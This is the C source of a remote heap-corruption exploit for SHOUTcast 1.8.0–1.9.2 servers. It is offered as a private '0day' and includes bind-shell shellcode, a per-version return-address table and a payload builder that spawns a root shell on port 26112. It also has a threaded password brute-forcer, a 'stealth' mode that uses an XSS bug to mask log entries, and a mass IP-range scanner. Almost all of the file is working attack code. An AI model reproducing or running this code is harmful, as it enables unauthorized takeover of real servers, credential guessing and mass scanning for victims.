/*
 *   SHOUTcast 1.8.0-1.9.2 remote 0day
 *   Keep it private or die bitch.
 *
 * by wsxz and d4rkgr3y
 *
 * thx to Akula, rash and Over_g
 *
 * to compile: gcc shoutdown2.c -pthread
 *
 * kp were added to THIS code
 *
  --/ www.priv8security.com -/- www.m00.ru /--
*/

#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <pthread.h>
#include <fcntl.h>

#define CLSD  0   //CLOSED
#define READY 1   //READY to work
#define CNTG  2   //CONNECTING
#define COUNT 30
#define TIMEOUT 3
#define DEFAULT_THREADS 3
#define DEFAULT_PORT 8001
#define DEFAULT_PASS "changeme"
#define CMD "echo;id;uname -a;echo\n"
//"unset HISTFILE\necho\n" \
//	"export PATH=/bin:/usr/bin/:/usr/local/bin/:/usr/sbin/:/sbin\n" \
//	"echo \"******  Welcome to '`hostname -f`'  ******\"\necho\n" \
//	"id\nuname -a\nuptime\n";

char lnxshellcode[] =
   "\x31\xdb"			// xor     ebx, ebx
   "\xf7\xe3"			// mul     ebx
   "\x53"			// push    ebx
   "\x43"			// inc     ebx
   "\x53"			// push    ebx
   "\x6a\x02"			// push    byte 2
   "\x89\xe1"			// mov     ecx, esp
   "\xb0\x66"			// mov     al, 102
   "\x52"                       // push    edx
   "\x50"                       // push    eax
   "\xcd\x80"			// int     80h
   "\x43"			// inc	   ebx
   "\x66\x53"			// push	   bx
   "\x89\xe1"			// mov	   ecx, esp
   "\x6a\x10"			// push	   byte 16
   "\x51"			// push	   ecx
   "\x50"			// push	   eax
   "\x89\xe1"			// mov	   ecx, esp
   "\x52"			// push	   edx
   "\x50"			// push	   eax
   "\xb0\x66"			// mov	   al, 102
   "\xcd\x80"			// int	   80h
   "\x89\xe1"			// mov	   ecx, esp
   "\xb3\x04"			// mov	   bl, 4
   "\xb0\x66"			// mov	   al, 102
   "\xcd\x80"			// int	   80h
   "\x43"			// inc	   ebx
   "\xb0\x66"			// mov	   al, 102
   "\xcd\x80"			// int	   80h
   "\x89\xd9"			// mov     ecx, ebx
   "\x93"			// xchg    eax, ebx
   "\xb0\x3f"			// mov     al, 63
   "\xcd\x80"			// int     80h
   "\x49"			// dec     ecx
   "\x79\xf9"			// jns     duploop
   "\x52"			// push    edx
   "\x68\x6e\x2f\x73\x68"	// push    dword 68732f6eh
   "\x68\x2f\x2f\x62\x69"	// push    dword 69622f2fh
   "\x89\xe3"			// mov     ebx, esp
   "\x52"			// push    edx
   "\x53"			// push    ebx
   "\x89\xe1"			// mov     ecx, esp
   "\xb0\x0b"			// mov     al, 11
   "\xcd\x80";			// int     80h

struct brute_part {
	char **passwords;
	int begin_word;
	int end;
	int npasswords;
	int mynumber;
	int port;
	int verbose;
};

struct
{
	char *platform;
	long eax_1;
	long eax_2;
	long ret;
	int chunk1_size;
	int chunk2_size;
	int payload_size;
	int max_buf;
	char *shellcode;
	int eType;
} targets[]=
{
	{"SHOUTcast 1.9.2 :: Linux/x86 ALL", 0x806d0e3, 0x806d0e3, 0x806d178, 191, 105, 100, 600, lnxshellcode, 0},
	{"SHOUTcast 1.8.9 :: Linux/x86 ALL", 0x90909090, 0x806993d, 0x80699b8, 193, 103, 100, 600, lnxshellcode, 0},
	{"SHOUTcast 1.8.3 :: Linux/x86 ALL", 0x90909090, 0x8069610, 0x8069740, 755, 159, 69, 1100, lnxshellcode, 1},
	{"SHOUTcast 1.8.0 :: Linux/x86 ALL", 0x90909090, 0x8067957, 0x8069740, 755, 167, 61, 1100, lnxshellcode, 1},
	//{"Auto :: Target from banner", 0x00000000, 0x00000000, 0x00000000, 0, 0, 0, 0, lnxshellcode, 2},
	{"Denial-of-Service attack", 0x91919191, 0xbadc0ded, 0xbadc0ded, 191, 105, 100, 600, lnxshellcode, 0},
};


char request[] =
	"icy-genre:DoS radio\r\n"
	"icy-url:aaa\r\n"
	"icy-pub:1\r\n"
	"icy-irc:N/A\r\n"
	"icy-icq:N/A\r\n"
	"icy-aim:N/A\r\n"
	"icy-br:160\r\n";

typedef struct  {
	int s;
	unsigned int state;
	unsigned int addr;
	unsigned int tmst;
} s_struct;

static s_struct *s;
static unsigned int count = COUNT;
unsigned int timeout = TIMEOUT;

void brute_shout(struct brute_part *);
void usage();

char pass[64] = DEFAULT_PASS;
char recvbuf[200];
int p = 0;
struct hostent *hp;

int main(int argc, char *argv[])
	{
        struct brute_part *b_info;
	unsigned int start=0,end=0;
	unsigned short port = DEFAULT_PORT;
	unsigned int sock,addr,hand;
	int nthreads = DEFAULT_THREADS;
	int chunk1, chunk2, payload, c;
	int stealth = 0;
	int i;
	int tgt = 0;
	int brute = 0;
	int verbose = 0;
	int step = 0;
	int nparts = 0;
	int npasswords = 0;
	int ntids = 0;
	int Type = 0;
	int mbuf;
	int lbuf;
	int nlogins = 3;
	char buf[1200] = "icy-name:";
	char buf2[64];
	char cmd[200] = CMD;
	char *host = NULL;
	char *wordlist_file;
	char **passwords;
	char *ver = NULL;
        FILE *wordlist;
        pthread_t *tids;

	printf("\nPRIV8 & m00 SECURITY CONFIDENTIAL SOURCE CODE MATERIAL!!\n");
	printf("SHOUTcast 1.8.3-1.9.2 remote heap corruption exploit!!!\n");
	printf("Coded by wsxz and d4rkgr3y\nGreetings to #priv8security and #m00sec ppl\n\n");

	if(argc<3) usage(argv[0]);
	while((c = getopt(argc, argv, "t:h:p:n:P:vw:bs:Se:c:T"))!= EOF) {
		switch (c) {
			case 't':
				tgt = atoi(optarg);
				break;
			case 'h':
				host = optarg;
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'P':
				memset(pass,'\x00',15);
				strncpy(pass,optarg,strlen(optarg));
				break;
			case 'b':
				brute = 1;
				break;
			case 'w':
				wordlist_file = optarg;
				break;
			case 'n':
				nthreads = atoi(optarg);
				break;
			case 'v':
				verbose = 1;
				break;
			case 's':
				start = inet_addr(optarg);
				break;
			case 'e':
				end = inet_addr(optarg);
				break;
			case 'c':
				count=atoi(optarg);
				break;
			case 'T':
				timeout=atoi(optarg);
				break;
			case 'S':
				stealth=1;
				break;
				/* for connect-back shellcode */
				/*
			case 'I':
				strncpy(cb, optarg, strlen(optarg));
				sscanf(cb, "%d.%d.%d.%d", &d1, &d2, &d3, &d4);
				lnxcbshellcode[32] = d1;
				lnxcbshellcode[33] = d2;
				lnxcbshellcode[34] = d3;
				lnxcbshellcode[35] = d4;
				break;
				*/
			default:
				usage(argv[0]);
				return 1;
		}
	}

	if(start && end) scan(start,end,port);
	if(host==NULL) usage(argv[0]);
	if(tgt>5) usage(argv[0]);


	printf("[~] Resolving hostname  => ");
	if((hp=gethostbyname(host))==NULL) {
		printf("failed\n");
		exit(1);
	}
	printf("done\n");

	printf("[~] Checking SHOUTcast server \t=> ");
	if((sock=connect_to_host(port))==-1) {
		printf("failed\n[-] Server is dead\n\n");
		exit(1);
	} else {
		send(sock,"fukinpassword",13,0);
		send(sock,"\r\n",2,0);
		sleep(1);
		recv(sock,recvbuf,20,0);
		if(strstr(recvbuf,"nvalid") || strstr(recvbuf,"OK")) {
			printf("done\n");
			close(sock);
		} else {
			printf("failed\n[-] Not an SHOUTcast server\n\n");
			exit(1);
		}
	}

	printf("[~] Checking SHOUTcast version  => ");
	if((sock=connect_to_host(port-1))==-1) {
		printf("failed\n");
	} else {
		send(sock,"GET / HTTP/1.1",24,0);
		send(sock,"\r\n\r\n",4,0);
		recv(sock,recvbuf,200,0);
		ver = strstr(recvbuf,"1.");
		ver[5]=0;
		printf("%s\n",&ver[0]);
		memset(recvbuf,'\x00',200);
		close(sock);
	}

/*
	if(targets[tgt].eType==2) {
		if(ver!=NULL) {
			if(strcmp(ver,"1.9.2\0")) tgt = 0;
			else if(strcmp(&ver[0],"1.8.9\0")) tgt = 1;
			else if(strstr(ver,"1.8.3")) tgt = 2;
			else { printf("[-] Not exploitable\n"); exit(0); }
		} else {
			printf("[-] Could not determine SHOUTcast version\n");
			exit(0);
		}
		printf("%i\n",tgt);
		exit(0);
	}
*/

	printf("[~] Constructing buf...\n");
	chunk1 = targets[tgt].chunk1_size;
	chunk2 = targets[tgt].chunk2_size;
	payload = targets[tgt].payload_size;
	Type = targets[tgt].eType;
	mbuf = targets[tgt].max_buf;

	if(!Type) { lbuf = 9; } else { strcat(buf,"m00\r\nicy-aim: "); lbuf = strlen(buf); }

	printf("=> 1st chunk: 0x%x\n",chunk1);
	printf("=> 2nd chunk: 0x%x\n",chunk2);
	printf("=> 1st eax: 0x%x\n",targets[tgt].eax_1);
	printf("=> 2nd eax: 0x%x\n",targets[tgt].eax_2);
	printf("=> ret: 0x%x\n",targets[tgt].ret);

	/* dont try to understand this =) */
	memset(buf+lbuf,'\x90',mbuf);
	//memset(buf+958,'\x91',50); // for debugging
	memcpy(buf+chunk1+lbuf, (unsigned char *) &targets[tgt].ret, 4);
	memcpy(buf+chunk1+lbuf+4+4, (unsigned char *) &targets[tgt].eax_1, 4);
	memcpy(buf+chunk1+lbuf+4+4+4+chunk2, (unsigned char *) &targets[tgt].eax_2, 4);
	memcpy(buf+chunk1+lbuf+4+4+4+chunk2+4+payload, targets[tgt].shellcode, strlen(lnxshellcode));
	/* xxx */
	printf("=> packet size: 0x%x\n",strlen(buf));
	if(verbose) printf("=> packet:\n%s\n",buf);

	if(brute || stealth) {
		if (wordlist_file == NULL) {
			printf("[-] Wordlist not specifed\n\n");
			exit(0);
		}
		else if((wordlist = fopen(wordlist_file, "r")) == 0) {
			printf("[-] Unable to open wordlist file - %s\n\n", wordlist_file);
		} else {
			if(stealth) {
				if((sock=connect_to_host(port))==-1) {
					printf("[-] Could not connect\n\n");
					exit(1);
				} else {
					send(sock,"m00 213.57.33.12<!--\n",21,0);
					close(sock);
				}
			}
			i = 0;
			while(fgets(buf2, 32, wordlist))
				npasswords++;
			passwords = (char **)malloc(npasswords * sizeof(buf2));
			fseek(wordlist, 0L, SEEK_SET);
			while(fgets(buf2, 32, wordlist)) {
				buf2[strlen(buf2) - 1]  = '\0';
				passwords[i] = (char *)malloc(sizeof(buf2));
				strcpy(passwords[i], buf2);
				i++;
			}
			fclose(wordlist);
			if (npasswords < 1) {
				printf("[-] Wordlist file is empty\n");
				exit(0);
			}
			if (nthreads > npasswords) {
				printf("=> Too many threads: 0x%x\n=> Reduction to: 0x%x\n\n", nthreads, npasswords);
				nthreads = npasswords;
			}
			nparts = nthreads;
			if ((npasswords%nthreads) != 0)
				nparts = ++nthreads;
			step = npasswords/nparts;
			printf("[~] Starting bruteforce...\n");
			printf("=> Passwords file is \"%s\"\n", wordlist_file);
			printf("=> %d threads per login\n", nthreads);
			if (verbose) printf("=> Verbose mode\n\n");

			tids = (pthread_t *)malloc(sizeof(tids[0]) * nparts);
			for (i = 0; i < nparts; i++) {
				b_info = (struct brute_part *)malloc(sizeof(struct brute_part));
				b_info->passwords = passwords;
				b_info->begin_word = i * step;
				if (i == (nparts - 1))
					b_info->end = npasswords;
				else
					b_info->end = (i * step) + step;
				b_info->npasswords = npasswords;
				b_info->mynumber = ntids + 1;
				b_info->verbose = verbose;
				b_info->port = port;
				pthread_create(&tids[ntids++], NULL, (void *)brute_shout, b_info);
				if (verbose)
					printf("-*- Thread number %d of %d started\n", ntids, nthreads);
			}
			if (verbose) printf("\n");
			printf("=> Bruteforcing NOW. Wait...\n");
			for (i = 0; i < ntids; i++)
				pthread_join(tids[i], NULL);
			if (verbose) printf("\n");
			printf("=> Bruteforcing finished!\n");
			if(p) printf("[+] Password is: %s",pass); else printf("[-] Password not guessed\n[~] Useing default: %s\n",DEFAULT_PASS);
			free(passwords);
			if(stealth) {
				if((sock=connect_to_host(port))==-1) {
					printf("[-] Could not connect\n\n");
					exit(1);
				} else {
					send(sock,"--><br><10/10/04@18:53:00> [source] invalid password from m00\n",63,0);
					close(sock);
					sleep(1);
				}
			}
		}
	}

	printf("[~] Conneting   \t=> ");
	if((sock=connect_to_host(port))==-1) {
		printf("failed\n");
		exit(1);
	}
	printf("done\n");

	printf("[~] Sending password \"%s\"..\n",pass);
	sleep(1);
	send(sock,pass,strlen(pass),0);
	send(sock,"\r\n",2,0);
	recv(sock,recvbuf,30,0);
	printf("=> %s",recvbuf);
	if(strstr(recvbuf,"nvalid")) {
		printf("[-] Authentication failed\n\n");
		close(sock);
		exit(0);
	}
	printf("[~] Sending user-info \t=> ");
	send(sock,request,strlen(request),0);
	printf("done\n");
	printf("[~] Sending icy-name \t=> ");
	send(sock,buf,strlen(buf),0);
	send(sock,"\r\n",2,0);
	printf("done\n[~] Sleeping => ");
	sleep(5); // need time to resolve shoutcast.com by victim
	printf("done\n[~] Connecting to bindshell => ");
	if((hand=connect_to_host(26112))==-1)
		printf("failed\n\n");
	else {
		printf("done\n[+] Shell spawned on port 26112 ^ have a nice root\n\n");
		/* if we will have windows, solaris targets, we need to add here
		additional checking */
		send(hand,cmd,strlen(cmd),0);
		get_shell(hand);
	}

	close(sock);
	exit(0);
}

void usage(char *progname)
{
	int b;
	printf("[~] Usage: %s -h <host> -t <target>\n\n",progname);
	printf("[~] Additional stuff:\n\t");
	printf("-p <port> - SHOUTcast port [%i]\n\t",DEFAULT_PORT);
	//printf("-I <ip> - connect-back IP (port 52224)\n\t");
	printf("-P <pass> - SHOUTcast password [%s]\n\t",DEFAULT_PASS);
	printf("-v - verbose mode\n");
	printf("[~] SHOUTcast password bruteforcing:\n\t");
	printf("-b - bruteforce mode ON\n\t");
	printf("-S - stealth bruteforcing (use XSS bug in log-view)\n\t");
	printf("-w <file> - file with passwords\n\t");
	printf("-n <threads> - # of threads per login [%i]\n",DEFAULT_THREADS);
	printf("[~] SHOUTcast MASS scanning options:\n\t");
	printf("-s <ip> - start IP\n\t");
	printf("-e <ip> - end IP\n\t");
	printf("-c <n> - count of connections for ip-range scan [%i]\n\t",COUNT);
	printf("-T <seconds> - timeout for each connection [%i]\n\n",TIMEOUT);
	printf("[~] Examples:\n\t");
	printf("%s -s 217.113.15.0 -e 217.113.18.255 -T 4 -c 35\n\t",progname);
	printf("%s -t 0 -h radiostorm.com -b -S -w wordlist.txt\n\n",progname);
	printf("[~] Targets:\n");
	for(b=0;b<5;b++) {
		printf("  %i %s\n", b, targets[b].platform);
	}
	printf("\n");
	exit(0);
}

int connect_to_host(int port)
{
	int sockt;
	struct sockaddr_in saddr;

	if((sockt=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
		return -1;
	memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
	saddr.sin_family=AF_INET;
	saddr.sin_addr.s_addr=*((unsigned long *)hp->h_addr_list[0]);
	saddr.sin_port=htons(port);
	if(connect(sockt, (struct sockaddr *)&saddr, sizeof(saddr))<0) {
		close(sockt);
		return -1;
	} else
	return sockt;
}

int get_shell(int bsh)
{
	fd_set rfds;
	int retVal,r;
	char buf[1000];
	do {
		FD_ZERO(&rfds);
		FD_SET(0, &rfds);
		FD_SET(bsh, &rfds);
		retVal=select(bsh+1, &rfds, NULL, NULL, NULL);
		if(retVal) {
			if(FD_ISSET(bsh, &rfds)) {

				buf[(r=recv(bsh, buf, 8095,0))]='\0';
				printf("%s", buf);
			}
			if(FD_ISSET(0, &rfds)) {
				buf[(r=read(0, buf, 8095))]='\0';
				send(bsh, buf, strlen(buf), 0);
			}
		}
	} while(retVal && r);

	close(bsh);
	return 1;
}

void brute_shout(struct brute_part *b_info)
{
	int sockn;
	int i, n = 0;
	int ans_size = 1024;
	int req_size = 256;
	char *req;
	char *answer;

	req = (char *)malloc(sizeof(char) * req_size);
	answer = (char *)malloc(sizeof(char) * ans_size);

	for (i = b_info->begin_word; i < b_info->end; i++) {
		sleep(b_info->mynumber - 1);
		if ((sockn = connect_to_host(b_info->port)) == -1) {
			printf("[-] could not connect\n");
			exit(-1);
		}
		bzero(answer, ans_size);
		sprintf(req, "%.250s\r\n", b_info->passwords[i]);
		write(sockn, req, strlen(req));

		if ((n = recv(sockn, answer, ans_size, 0)) <= 0) {
			perror("[-] recv() error\n");
			printf("[~] Thread #%d terminated!\n", b_info->mynumber);
			break;
		}

		if(!strstr(answer, "invalid")) {
			//printf("\n[+] FOUNDED! Password is \"%s\"\n\n",b_info->passwords[i]);
			strncpy(pass, b_info->passwords[i], strlen(b_info->passwords[i]));
			p = 1;
			break;
		}
	}

	free(req);
	free(answer);
	close(sockn);
	if (b_info->verbose)
		printf("-*- Thread number %d finished -*-\n", b_info->mynumber);
	pthread_exit(0);
}

int scan(unsigned int start, unsigned int end, int port) {
	struct in_addr inaddr;
	struct sockaddr_in dst;
	struct timeval tv = {0,0};
	static unsigned int run = 0;
	static unsigned int i,j,k;
	static long on = 1;
	static long off = 0;
	unsigned int pause;
	unsigned int ex,any;
	unsigned int left;
	unsigned int *con; // IPs of alive shoutcast daemons
	unsigned int index; // count of sucessfully connections
	unsigned int vuln; // count of vulnerable ftp daemons
	fd_set  fdset;

	if(start == -1) {
		printf("[-] Bad <start_ip>.\n\n");
		exit(0);
	}
	if(end == -1) {
		printf("[-] Bad <end_ip>.\n\n");
		exit(0);
	}

	printf("[~] Scanning IP-range\n",start,end);
	s = (s_struct *)malloc(count*sizeof(s_struct));
	memset(s,0,count*sizeof(s_struct));

	FD_ZERO(&fdset);
	ex = 0;
	left = htonl(end)-htonl(start)+1;
	con = (unsigned int *) malloc(left*sizeof(unsigned int));
	memset(con,0,left*sizeof(unsigned int));

	index = 0;
	vuln = 0;

	memset(&dst,0,sizeof(dst));
	dst.sin_addr.s_addr = start;
	dst.sin_port = htons(port);
	dst.sin_family = AF_INET;
	run = 1;
	usleep(10);

	while(!ex) {
		for(i=0;(i<count) && left;i++) {
			if(s[i].state == CLSD)   {
				s[i].s = socket(AF_INET,SOCK_STREAM,0);
				if(s[i].s > 0) {
					fcntl(s[i].s,F_SETFL,O_NONBLOCK);
					s[i].state = READY;
				}
			}

			if(s[i].state == READY){
				connect(s[i].s,(struct sockaddr*)&dst,sizeof(dst));
				s[i].state = CNTG;
				s[i].addr = dst.sin_addr.s_addr;
				s[i].tmst = time(NULL);
				dst.sin_addr.s_addr=htonl(ntohl(dst.sin_addr.s_addr)+1);
				left--;
			}
		}

		FD_ZERO(&fdset);
		for(i=0;i<count;i++)
			if(s[i].state == CNTG)
				FD_SET(s[i].s,&fdset);
				select(FD_SETSIZE,NULL,&fdset,NULL,&tv);
				for(i=0;i<count;i++) {
					if(FD_ISSET(s[i].s,&fdset))  {
						fcntl(s[i].s,F_SETFL,O_RDWR);
						// if it's possible to send something => tcp connection established.
						if (!(send(s[i].s, "changeme\n\n", 10 , 0)<0)){
							inaddr.s_addr = s[i].addr;
							recv(s[i].s,recvbuf,200,0);
							printf("[+] %s:%d => OPENED\nSHOUTcast => ",inet_ntoa(inaddr),port);
							// vulnerable proftpd versions (without "rc*" shit). I forgot something?
							if(strstr(recvbuf,"nvalid")) {
								printf("YES\nDefault pass => NO\n");
								*(unsigned int *) (con+vuln*sizeof(unsigned int)) = s[i].addr;
								vuln++;
							} else if(strstr(recvbuf,"OK")) {
								printf("YES\nDefault pass => YES\n");
								*(unsigned int *) (con+vuln*sizeof(unsigned int)) = s[i].addr;
								vuln++;
							} else printf("NO\n");
						}
						close(s[i].s);
						s[i].state = CLSD;
					}
				}

			FD_ZERO(&fdset);
			for(i=0;i<count;i++) {
				if(s[i].state == CNTG) {
					if((time(NULL)-s[i].tmst)>timeout)    {
						fcntl(s[i].s,F_SETFL,O_RDWR);
						close(s[i].s);
						s[i].state = CLSD;
						inaddr.s_addr = s[i].addr;
					} else FD_SET(s[i].s,&fdset);
				}
			}

			select(FD_SETSIZE,NULL,NULL,&fdset,&tv);
			for(i=0;i<count;i++) {
				if(FD_ISSET(s[i].s,&fdset)) {
					fcntl(s[i].s,F_SETFL,O_RDWR);
					close(s[i].s);
					s[i].state = CLSD;
					inaddr.s_addr = s[i].addr;
				}
			}
			if (!left) {
				any=0;
				for (i=0;i<count;i++) {
					if (s[i].state != CLSD)  any=1;
						if (!any) ex = 1;
				}
			}
		usleep(pause*1000);
	} // while(!ex)

	printf("[+] Scanning complete\n[~] [%i] SHOUTcast servers found\n\n",vuln);
	exit(0);
}
